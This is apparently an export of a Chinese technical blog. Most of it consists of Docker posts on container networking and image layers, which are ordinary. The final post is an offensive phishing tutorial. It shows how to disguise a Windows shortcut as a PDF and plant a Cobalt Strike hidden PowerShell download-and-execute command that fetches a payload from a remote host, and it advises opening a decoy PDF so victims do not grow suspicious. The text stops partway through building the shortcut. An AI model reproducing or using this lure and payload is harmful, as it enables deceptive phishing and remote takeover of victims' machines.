<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">尝试直接ping容器名，ping不通</span>	</span><br><span class="line">[root@VM-0-15-centos ~]# docker exec -it tomcat02 ping tomcat03</span><br><span class="line">ping: tomcat03: Name or service not known</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">通过--link可以解决</span></span><br><span class="line"><span class="meta">#</span><span class="bash">启动tomcat4，并关联tomcat03，tomcat04可以通过直接ping容器名 tomcat03 ping通</span></span><br><span class="line">[root@VM-0-15-centos ~]# docker run -d -P --name tomcat04 --link tomcat03 tomcat</span><br><span class="line">aa09aa2dbd2425f5e54fa89259069f82523c821ebec865ad452238d7ad8f9fd5</span><br><span class="line">[root@VM-0-15-centos ~]# docker exec -it tomcat04 ping tomcat03</span><br><span class="line">PING tomcat03 (172.18.0.7) 56(84) bytes of data.</span><br><span class="line">64 bytes from tomcat03 (172.18.0.7): icmp_seq=1 ttl=64 time=0.114 ms</span><br><span class="line">64 bytes from tomcat03 (172.18.0.7): icmp_seq=2 ttl=64 time=0.065 ms</span><br><span class="line">64 bytes from tomcat03 (172.18.0.7): icmp_seq=3 ttl=64 time=0.065 ms</span><br><span class="line">64 bytes from tomcat03 (172.18.0.7): icmp_seq=4 ttl=64 time=0.065 ms</span><br><span class="line">^C</span><br><span class="line">--- tomcat03 ping statistics ---</span><br><span class="line">4 packets transmitted, 4 received, 0% packet loss, time 1002ms</span><br><span class="line">rtt min/avg/max/mdev = 0.065/0.077/0.114/0.022 ms</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">但是反向ping，tomcat03无法直接通过ping容器名ping通</span></span><br><span class="line">[root@VM-0-15-centos ~]# docker exec -it tomcat03 ping tomcat04</span><br><span class="line">ping: tomcat04: Name or service not known</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;查看tomcat04的/etc/hosts文件</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630856398994-b8392a92-ac97-4b6a-a721-46fabf2804a9.png" alt="img"></p>
<p>&emsp;&emsp;查看tomcat03的/etc/hosts文件</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630856442394-15c8f656-8d37-4f97-bdf9-f6ef3eb5c515.png" alt="img"></p>
<p>&emsp;&emsp;–link就是在hosts配置中增加了一条解析</p>
<p>&emsp;&emsp;不推荐使用–link。docker0问题：它不支持容器名直接访问</p>
<h1 id="三、自定义网络"><a href="#三、自定义网络" class="headerlink" title="三、自定义网络"></a>三、自定义网络</h1><p>&emsp;&emsp;自定义的网络完善了docker0不支持容器名访问的缺点和–link不能相互ping通的缺点，只要是在同一自定义网络下，都能直接通过容器名相互ping通</p>
<p>&emsp;&emsp;查看所有的docker网络：<code>docker network ls</code></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630860163028-808b75e5-4e7d-4d70-bcb7-ab7148683b02.png" alt="img"></p>
<h2 id="1、网络模式"><a href="#1、网络模式" class="headerlink" title="1、网络模式"></a>1、网络模式</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bridge：桥接（默认，自己创建也使用bridge模式）</span><br><span class="line">none：不配置网络</span><br><span class="line">host：和宿主机共享网络</span><br><span class="line">container：容器网络连通（用的少，局限性大）</span><br></pre></td></tr></table></figure>

<h2 id="2、测试"><a href="#2、测试" class="headerlink" title="2、测试"></a>2、测试</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 我们直接启动的命令 --net bridge，而这个就是我们的docker0</span></span><br><span class="line">docker run -d -P --name tomcat02 tomcat</span><br><span class="line">等价于</span><br><span class="line">docker run -d -P --name tomcat02 --net bridge tomcat</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> docker0特点：默认，容器名不能访问，--link可以打通连接</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">我们可以用create命令自定义一个网络</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> --driver bridge（默认）</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> --subnet 192.168.0.0/16（子网掩码）</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> --gateway 192.168.0.1（网关）</span></span><br><span class="line">[root@VM-0-15-centos ~]# docker network create --driver bridge --subnet 192.168.0.0/16 --gateway 192.168.0.1 mynet</span><br><span class="line">b93f7bc668c46baa7657025e029f13022c8c529e33b2eec1a73d2e29cd4af340</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> ls命令查看网络，我们自己的网络创建好了</span></span><br><span class="line">[root@VM-0-15-centos ~]# docker network ls</span><br><span class="line">NETWORK ID     NAME      DRIVER    SCOPE</span><br><span class="line">115a2351052d   bridge    bridge    local</span><br><span class="line">a8299a5d2f22   host      host      local</span><br><span class="line">b93f7bc668c4   mynet     bridge    local  #（mynet网络创建成功）</span><br><span class="line">431f88da42b1   none      null      local</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> inspect命令查看meynet网络信息</span></span><br><span class="line">[root@VM-0-15-centos ~]# docker network inspect mynet</span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;Name&quot;: &quot;mynet&quot;,</span><br><span class="line">        &quot;Id&quot;: &quot;b93f7bc668c46baa7657025e029f13022c8c529e33b2eec1a73d2e29cd4af340&quot;,</span><br><span class="line">        &quot;Created&quot;: &quot;2021-09-06T00:59:48.490085063+08:00&quot;,</span><br><span class="line">        &quot;Scope&quot;: &quot;local&quot;,</span><br><span class="line">        &quot;Driver&quot;: &quot;bridge&quot;,</span><br><span class="line">        &quot;EnableIPv6&quot;: false,</span><br><span class="line">        &quot;IPAM&quot;: &#123;</span><br><span class="line">            &quot;Driver&quot;: &quot;default&quot;,</span><br><span class="line">            &quot;Options&quot;: &#123;&#125;,</span><br><span class="line">            &quot;Config&quot;: [</span><br><span class="line">                &#123;</span><br><span class="line">                    &quot;Subnet&quot;: &quot;192.168.0.0/16&quot;,</span><br><span class="line">                    &quot;Gateway&quot;: &quot;192.168.0.1&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;Internal&quot;: false,</span><br><span class="line">        &quot;Attachable&quot;: false,</span><br><span class="line">        &quot;Ingress&quot;: false,</span><br><span class="line">        &quot;ConfigFrom&quot;: &#123;</span><br><span class="line">            &quot;Network&quot;: &quot;&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;ConfigOnly&quot;: false,</span><br><span class="line">        &quot;Containers&quot;: &#123;&#125;,</span><br><span class="line">        &quot;Options&quot;: &#123;&#125;,</span><br><span class="line">        &quot;Labels&quot;: &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置网络模式为自己创建的网络mynet，建立tomcat-net-01和tomcat-net-02</span></span><br><span class="line">[root@VM-0-15-centos ~]# docker run -d -P --name tomcat-net-01 --net mynet tomcat</span><br><span class="line">e067a02080bb5ad3bf38496c5cb5f5a6274ac3e67d3ec378106485e3c98ad470</span><br><span class="line">[root@VM-0-15-centos ~]# docker run -d -P --name tomcat-net-02 --net mynet tomcat</span><br><span class="line">830a53b87c0758aa8c985195b83b63f4e2dbebdb5e99b5bba5a39ca349a12650</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> inspect命令查看meynet网络信息，可以看到多了两个对应的新加入的container（容器）</span></span><br><span class="line">[root@VM-0-15-centos ~]# docker network inspect mynet</span><br><span class="line">[root@VM-0-15-centos ~]# docker network inspect mynet</span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;Name&quot;: &quot;mynet&quot;,</span><br><span class="line">        &quot;Id&quot;: &quot;b93f7bc668c46baa7657025e029f13022c8c529e33b2eec1a73d2e29cd4af340&quot;,</span><br><span class="line">        &quot;Created&quot;: &quot;2021-09-06T00:59:48.490085063+08:00&quot;,</span><br><span class="line">        &quot;Scope&quot;: &quot;local&quot;,</span><br><span class="line">        &quot;Driver&quot;: &quot;bridge&quot;,</span><br><span class="line">        &quot;EnableIPv6&quot;: false,</span><br><span class="line">        &quot;IPAM&quot;: &#123;</span><br><span class="line">            &quot;Driver&quot;: &quot;default&quot;,</span><br><span class="line">            &quot;Options&quot;: &#123;&#125;,</span><br><span class="line">            &quot;Config&quot;: [</span><br><span class="line">                &#123;</span><br><span class="line">                    &quot;Subnet&quot;: &quot;192.168.0.0/16&quot;,</span><br><span class="line">                    &quot;Gateway&quot;: &quot;192.168.0.1&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;Internal&quot;: false,</span><br><span class="line">        &quot;Attachable&quot;: false,</span><br><span class="line">        &quot;Ingress&quot;: false,</span><br><span class="line">        &quot;ConfigFrom&quot;: &#123;</span><br><span class="line">            &quot;Network&quot;: &quot;&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;ConfigOnly&quot;: false,</span><br><span class="line">        &quot;Containers&quot;: &#123;</span><br><span class="line">            &quot;830a53b87c0758aa8c985195b83b63f4e2dbebdb5e99b5bba5a39ca349a12650&quot;: &#123;</span><br><span class="line">                &quot;Name&quot;: &quot;tomcat-net-02&quot;,</span><br><span class="line">                &quot;EndpointID&quot;: &quot;d86423260674d0300b6d1da749c5dad721683966b1d4bc59e714a317c60c7df9&quot;,</span><br><span class="line">                &quot;MacAddress&quot;: &quot;02:42:c0:a8:00:03&quot;,</span><br><span class="line">                &quot;IPv4Address&quot;: &quot;192.168.0.3/16&quot;,</span><br><span class="line">                &quot;IPv6Address&quot;: &quot;&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;e067a02080bb5ad3bf38496c5cb5f5a6274ac3e67d3ec378106485e3c98ad470&quot;: &#123;</span><br><span class="line">                &quot;Name&quot;: &quot;tomcat-net-01&quot;,</span><br><span class="line">                &quot;EndpointID&quot;: &quot;c182a6883d2c0f19137f5085dce4415a4eaf49d5e04cc1775a84f0e0f2482995&quot;,</span><br><span class="line">                &quot;MacAddress&quot;: &quot;02:42:c0:a8:00:02&quot;,</span><br><span class="line">                &quot;IPv4Address&quot;: &quot;192.168.0.2/16&quot;,</span><br><span class="line">                &quot;IPv6Address&quot;: &quot;&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;Options&quot;: &#123;&#125;,</span><br><span class="line">        &quot;Labels&quot;: &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 自定义的网络完善了docker0不支持容器名访问的缺点和--link不能相互ping通的缺点，只要是在同一自定义网络下，都能直接通过容器名相互ping通</span></span><br><span class="line">[root@VM-0-15-centos ~]# docker exec -it tomcat-net-01 ping 192.168.0.3</span><br><span class="line">PING 192.168.0.3 (192.168.0.3) 56(84) bytes of data.</span><br><span class="line">64 bytes from 192.168.0.3: icmp_seq=1 ttl=64 time=0.096 ms</span><br><span class="line">64 bytes from 192.168.0.3: icmp_seq=2 ttl=64 time=0.071 ms</span><br><span class="line"></span><br><span class="line">[root@VM-0-15-centos ~]# docker exec -it tomcat-net-02 ping 192.168.0.2</span><br><span class="line">PING 192.168.0.2 (192.168.0.2) 56(84) bytes of data.</span><br><span class="line">64 bytes from 192.168.0.2: icmp_seq=1 ttl=64 time=0.084 ms</span><br><span class="line">64 bytes from 192.168.0.2: icmp_seq=2 ttl=64 time=0.064 ms</span><br></pre></td></tr></table></figure>

<h1 id="四、网络连通"><a href="#四、网络连通" class="headerlink" title="四、网络连通"></a>四、网络连通</h1><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630862317542-5de9ff4b-79cf-491f-9af5-92b388fdd9b7.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630862381708-9f0c82aa-cc50-4c42-8ca2-30106e004f3c.png" alt="img"></p>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 尝试用tomcat01 ping tomcat-net-01，ping不通，因为网络没有连通</span></span><br><span class="line">[root@VM-0-15-centos ~]# docker exec -it tomcat01 ping tomcat-net-01</span><br><span class="line">ping: tomcat-net-01: Name or service not known</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 将tomcat01加入到网络mynet中</span></span><br><span class="line">[root@VM-0-15-centos ~]# docker network connect mynet tomcat01</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看mynet的信息，可以看到tomcat01加入了mynet，并有了个IPv4地址：192.168.0.4/16</span></span><br><span class="line">[root@VM-0-15-centos ~]# docker network inspect mynet</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630864094838-389f6032-5edd-4ef9-93c7-121c9d6b642c.png" alt="img"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 相当于给tomcat01一块新的网卡，这块网卡选择加入mynet中</span></span><br><span class="line">[root@VM-0-15-centos ~]# docker exec -it tomcat01 ip addr</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630864381298-f51d4aa4-5751-44aa-8a50-985f7694243b.png" alt="img"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 本机IP信息</span></span><br><span class="line">[root@VM-0-15-centos ~]# ip addr</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630864508182-403706a0-2444-4570-9c1d-5aa5903a3f7c.png" alt="img"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> tomcat01可以ping通tomcat-net-01了</span></span><br><span class="line">[root@VM-0-15-centos ~]# docker exec -it tomcat01 ping tomcat-net-01</span><br><span class="line">PING tomcat-net-01 (192.168.0.2) 56(84) bytes of data.</span><br><span class="line">64 bytes from tomcat-net-01.mynet (192.168.0.2): icmp_seq=1 ttl=64 time=0.081 ms</span><br><span class="line">64 bytes from tomcat-net-01.mynet (192.168.0.2): icmp_seq=2 ttl=64 time=0.065 ms</span><br><span class="line">64 bytes from tomcat-net-01.mynet (192.168.0.2): icmp_seq=3 ttl=64 time=0.066 ms</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;网络模型</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630890527389-61dd182f-acbb-4f97-8297-394191b2eb58.png" alt="img"></p>
<h1 id="五、实战"><a href="#五、实战" class="headerlink" title="五、实战"></a>五、实战</h1>]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>docker镜像讲解</title>
    <url>/post/9e39f1c0.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、镜像是什么"><a href="#一、镜像是什么" class="headerlink" title="一、镜像是什么"></a>一、镜像是什么</h1><p>&emsp;&emsp;镜像是一种轻量级、可执行的独立软件包，用来打包软件运行环境和基于运行环境开发的软件，它包含运行某个软件所需的所有内容，包括代码、运行时、库、环境变量和配置文件。</p>
<p>&emsp;&emsp;所有的应用，直接打包docker镜像，就可以直接跑起来</p>
<p>&emsp;&emsp;如何得到镜像：</p>
<ul>
<li><p>从远程仓库下载</p>
</li>
<li><p>朋友拷贝给你</p>
</li>
<li><p>自己制作一个镜像DockerFile</p>
</li>
</ul>
<h1 id="二、Docker镜像加载原理"><a href="#二、Docker镜像加载原理" class="headerlink" title="二、Docker镜像加载原理"></a>二、Docker镜像加载原理</h1><h2 id="1、UnionFS（联合文件系统）"><a href="#1、UnionFS（联合文件系统）" class="headerlink" title="1、UnionFS（联合文件系统）"></a>1、UnionFS（联合文件系统）</h2><p>&emsp;&emsp;UnionFS (联合文件系统) : Union文件系统( UnionFS)是一种分层、 轻量级并且高性能的文件系统，它支持对文件系统的修改作为一次提交来一层层的叠加，同时可以将不同目录挂载到同一个虚拟文件系统下（unite several directories into a single virtual filesystem）。Union文件系统是Docker镜像的基础。镜像可以通过分层来进行继承，基于基础镜像（没有父镜像）,可以制作各种具体的应用镜像。</p>
<p>&emsp;&emsp;特性：一次同时加载多个文件系统，但从外面看起来，只能看到一个文件系统，联合加载会把各层文件系统叠加起来，这样最终的文件系统会包含所有底层的文件和目录</p>
<p>&emsp;&emsp;我们下载镜像的时候看到的一层层就是这个</p>
<h2 id="2、Docker镜像加载原理"><a href="#2、Docker镜像加载原理" class="headerlink" title="2、Docker镜像加载原理"></a>2、Docker镜像加载原理</h2><p>&emsp;&emsp;Docker的镜像实际上由一层一层的文件系统组成，这种层级的文件系统UnionFS。</p>
<p>&emsp;&emsp;BootFS（Boot File System）主要包含bootloader和kernel，bootloader主要是引|导加载kernel，Linux刚启动时会加载BootFS文件系统，在Docker镜像的最底层是bootfs。这一层与我们典型的Linux/Unix系统是一样的，包含boot加载器和内核。当boot加载完成之后整个内核就都在内存中了，此时内存的使用权已由BootFS转交给内核，此时系统也会卸载bootfs.</p>
<p>&emsp;&emsp;RootFS (Root File System) ，在bootfs之上。包含的就是典型Linux 系统中的/dev， /proc， /bin， /etc等标准目录和文件。RootFS就是各种不同的操作系统发行版，比如Ubuntu，Centos等等。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630378194134-f0a43a44-9cb2-42da-9175-edcc615c4fe6.png" alt="img"></p>
<p>&emsp;&emsp;平时我们安装进虚拟机的CentOS都是好几个G，为什么Docker这里才200M？</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630378258217-0d43a7c0-6a45-4f54-a4ee-30bfba0c7b89.png" alt="img"></p>
<p>&emsp;&emsp;对于一个精简的OS，RootfFS可以很小，只需要包含最基本的命令，工具和程序库就可以了，因为底层直接用Host的kernel，自己只需要提供RootFS就可以了。由此可见对于不同的linux发行版，BootFS基本是一致的，RootFS会有差别，因此不同的发行版可以公用BootFS。</p>
<h2 id="3、分层理解"><a href="#3、分层理解" class="headerlink" title="3、分层理解"></a>3、分层理解</h2><h3 id="（1）分层的镜像"><a href="#（1）分层的镜像" class="headerlink" title="（1）分层的镜像"></a>（1）分层的镜像</h3><p>&emsp;&emsp;我们可以去下载一个镜像，注意观察下载的日志输出，可以看到是一层一层的在下载！</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630378524848-56f34cbd-f790-4491-bdd2-420762fb2cc0.png" alt="img"></p>
<p>&emsp;&emsp;思考：为什么Docker镜像要采用这种分层的结构呢？</p>
<p>&emsp;&emsp;最大的好处，我觉得莫过于是资源共享了！比如有多个镜像都从相同的Base镜像构建而来，那么宿主机只需在磁盘上保留一份base镜像，同时内存中也只需要加载一份base镜像，这样就可以为所有的容器服务了，且镜像的每一层都可以被共享。</p>
<p>&emsp;&emsp;查看镜像分层的方式可以通过<code>docker image inspect 镜像名</code>命令！</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630379789310-2a328dcd-b855-4773-aa75-f440c93564d7.png" alt="img"></p>
<h3 id="（2）理解"><a href="#（2）理解" class="headerlink" title="（2）理解"></a>（2）理解</h3><p>&emsp;&emsp;所有的Docker镜像都起始于一个基础镜像层，当进行修改或增加新的内容时，就会在当前镜像层之上，创建新的镜像层。</p>
<p>&emsp;&emsp;举一个简单的例子，假如基于Ubuntu Linux 16.04创建一个新的镜像，这就是新镜像的第一层；如果在该镜像中添加Python包，就会在基础镜像层之上创建第二个镜像层；如果继续添加一个安全补丁，就会创建第三个镜像层。</p>
<p>&emsp;&emsp;该镜像当前已经包含3个镜像层，如下图所示（这只是一个用于演示的很简单的例子）</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630379931355-662a173d-b5ac-4619-b929-442a4c543d46.png" alt="img"></p>
<p>&emsp;&emsp;在添加额外的镜像层的同时,镜像始终保持是当前所有镜像的组合，理解这一点点常重要。 图中举了一个简单的例子，每个镜像包含3个文件，而镜像包含了来自两个镜像层的6个文件。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630379992732-33c35650-e3dc-4a97-bb5e-39ab82693187.png" alt="img"></p>
<p>&emsp;&emsp;上图中的镜像层跟之前图中的略有区别，主要目的是便于展示文件。下图中展示了一个稍微复杂的三层镜像，在外部看来整个镜像只有6个文件，这是因为最上层中的文件7是文件5的一个更新版本。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630380069106-5f074aae-bb2e-40aa-b8ba-07430052ebe6.png" alt="img"></p>
<p>&emsp;&emsp;这种情况下，上层镜像层中的文件覆盖了底层镜像层中的文件。这样就使得文件的更新版本作为一个新镜像层添加到镜像当中。</p>
<p>&emsp;&emsp;Docker通过存储引擎（新版本采用快照机制）的方式来实现镜像层堆栈,，保证多镜像层对外展示为统一的文件系统。</p>
<p>&emsp;&emsp;Linux上可用的存储引擎有AUFS、Overlay2、Device Mapper、Btrfs以及ZFS。顾名思义，每种存储引擎都基于Linux中对应的文件系统或者块设备技术，并且每种存储引擎擎都有其独有的性能特点。</p>
<p>&emsp;&emsp;Docker在Windows上仅支持windowsfilter一种存储引擎，该引擎基于NTFS文件系统之上实现了分层和CoW[1]。</p>
<p>&emsp;&emsp;下图展示了与系统显示相同的三层镜像。所有镜像层堆叠并合并，对外提供统一的视图。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630380496024-abad9527-7903-4fc7-a9ed-a7874baa30b8.png" alt="img"></p>
<h3 id="（3）特点"><a href="#（3）特点" class="headerlink" title="（3）特点"></a>（3）特点</h3><p>&emsp;&emsp;Docker镜像都是只读的，当容器启动时，一个新的可写层被加载到镜像的顶部！</p>
<p>&emsp;&emsp;这一层就是我们通常说的容器层，容器之下的都叫镜像层！</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630380628445-60392a4a-a129-45e5-a53a-050579f46cd0.png" alt="img"></p>
]]></content>
  </entry>
  <entry>
    <title>lnk快捷方式钓鱼</title>
    <url>/post/1cb9d074.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>lnk文件是用于指向其他文件的一种文件。这些文件通常称为快捷方式文件，通常它以快捷方式放在硬盘上，以方便使用者快速的调用。</p>
<p>lnk钓鱼主要将图标伪装成正常图标，但是目标会执行shell命令。</p>
<h1 id="二、初体验"><a href="#二、初体验" class="headerlink" title="二、初体验"></a>二、初体验</h1><p>找到计算器所在目录，创建快捷方式</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645769060639-c3e7848b-664b-4dc8-88c7-3a001c277b50.png" alt="img"></p>
<p>下图为calc.exe的快捷方式的属性信息，我们可以在“目标”栏写入自己的恶意命令，如powershell上线命令</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645769131278-352d6a7f-b3bf-4335-9901-f5085ea1d08a.png" alt="img"></p>
<p>这里以使用cmd调用计算器为例</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\cmd.exe /c calc.exe</span><br><span class="line"><span class="comment"># cmd /c 命令  执行完命令后关闭命令窗口</span></span><br><span class="line"><span class="comment"># cmd /k 命令  执行完命令后不关闭命令窗口</span></span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645770208380-00eed2ba-c86e-4e21-9272-5166699e3cdd.png" alt="img"></p>
<p>此时点击点击该快捷方式，黑框一闪就弹出计算器</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645807514138-be2d5add-14b0-470e-83ac-30a671228f7e.gif" alt="img"></p>
<h1 id="三、图标问题"><a href="#三、图标问题" class="headerlink" title="三、图标问题"></a>三、图标问题</h1><p>而在实施钓鱼过程中，对于我们的calc.exe的快捷方式来说，一个大大的计算机ico图标，显然看起来不像一个好玩意，因此可以尝试在“属性”中去更改该文件的图标：</p>
<p>图标文件路径：%SystemRoot%\System32\shell32.dll</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645769266113-86b30624-a515-420c-9e6d-5af0302d7269.png" alt="img"></p>
<p>随便选一个后，如下所示</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645803139895-ac9d8315-f0d0-468b-930f-08b732a30006.png" alt="img"></p>
<p>但是用系统自带的ico去做文件图标替换的话，有个弊端，即当替换的ico在目标机器上不存在时，就会出现类似空白ico图标：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645769359573-32c5fb9e-ff5a-4512-94fb-0399032b6e23.png" alt="img"></p>
<p>用010 Editor打开该LNK文件，找到String Data部分ICON_LOCATION字符串</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645807892864-739920f4-bead-4f99-9bf1-bfb6842a1e28.png" alt="img"></p>
<p>根据crazyman师傅所说，修改lnk的icon_location标志位，修改为相关后缀，系统即可⾃动联想到对应的打开⽅式。</p>
<p>具体原理参考：<a href="https://bbs.pediy.com/thread-260953.htm">https://bbs.pediy.com/thread-260953.htm</a></p>
<p>我们要将其修改为<code>.\1.pdf</code>(Unicode)，其长度0x07：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645807936780-493b1b73-9589-4ae5-8bb6-03e22f4b761b.png" alt="img"></p>
<p>保存修改后，此时calc.exe的快捷方式图标为PDF的了</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645808089358-78421d16-bb95-471c-93e9-c3cc1b348577.png" alt="img"></p>
<p>⽐如我的pdf默认是由edge浏览器打开，则在icon_location中设置为pdf后缀时，⽂件的ico也会自动显示为edge浏览器打开的图标， 这样可以达到<strong>⾃适配</strong>的效果</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645769456367-43a3c065-8e08-4b21-a514-fb840bee9618.png" alt="img"></p>
<h1 id="四、进阶伪装"><a href="#四、进阶伪装" class="headerlink" title="四、进阶伪装"></a>四、进阶伪装</h1><p>当受害者中招打开我们的所谓的pdf，实则为恶意的快捷方式时，双击两下，什么反应都没有，可能会有一丝疑惑，因此可以当尝试用powershell、mshta等方式上线时，我们可以更改如cobaltstrike生成的代码，加上一段自动下载打开一份真的pdf，来达到逼真的效果。</p>
<h1 id="五、使用cobaltstrike"><a href="#五、使用cobaltstrike" class="headerlink" title="五、使用cobaltstrike"></a>五、使用cobaltstrike</h1><h2 id="1、创建监听器"><a href="#1、创建监听器" class="headerlink" title="1、创建监听器"></a>1、创建监听器</h2><p>这里就创建给Beacon HTTP</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646026475312-fb3f683f-824e-460d-813b-ba3bb9d897a0.png" alt="img"></p>
<h2 id="2、生成后门代码"><a href="#2、生成后门代码" class="headerlink" title="2、生成后门代码"></a>2、生成后门代码</h2><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646026501031-1edf3efd-3a23-428e-b17c-fad518467584.png" alt="img"></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell.exe <span class="literal">-nop</span> <span class="literal">-w</span> <span class="keyword">hidden</span> <span class="literal">-c</span> <span class="string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.1.105:80/a&#x27;))&quot;</span></span><br><span class="line"></span><br><span class="line">[+] <span class="literal">-nop</span>：NoProfile，使用此参数阻止PowerShell在开机时加载配置文件脚本，以避免载入非预期的命令或设置</span><br><span class="line">[+] <span class="literal">-w</span>：WindowStyle，将窗口样式设置为 Normal、Minimized、Maximized 或 <span class="keyword">Hidden</span>。</span><br><span class="line">[+] <span class="literal">-c</span>：Command，执行指定的命令(和任何参数)</span><br><span class="line"><span class="function">[+] <span class="title">IEX</span></span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;#&#123;remote_script&#125;&#x27;</span>); 该命令将<span class="comment">#&#123;remote_script&#125;加载到内存，并没有把该脚本下载到本地</span></span><br><span class="line">[+] <span class="built_in">Iex</span>命令为invove<span class="literal">-expression</span>的别名：接收一个字符串作为要运行的完整命令（包括参数）。</span><br></pre></td></tr></table></figure>

<h2 id="3、创建快捷方式lnk文件"><a href="#3、创建快捷方式lnk文件" class="headerlink" title="3、创建快捷方式lnk文件"></a>3、创建快捷方式lnk文件</h2><p>首先要知道PowerShell.exe目录：<code>C:\Windows\System32\WindowsPowerShell\v1.0\</code></p>
<p>创建快捷方式，在对象的位置将目录和木马代码拼接起来</p>
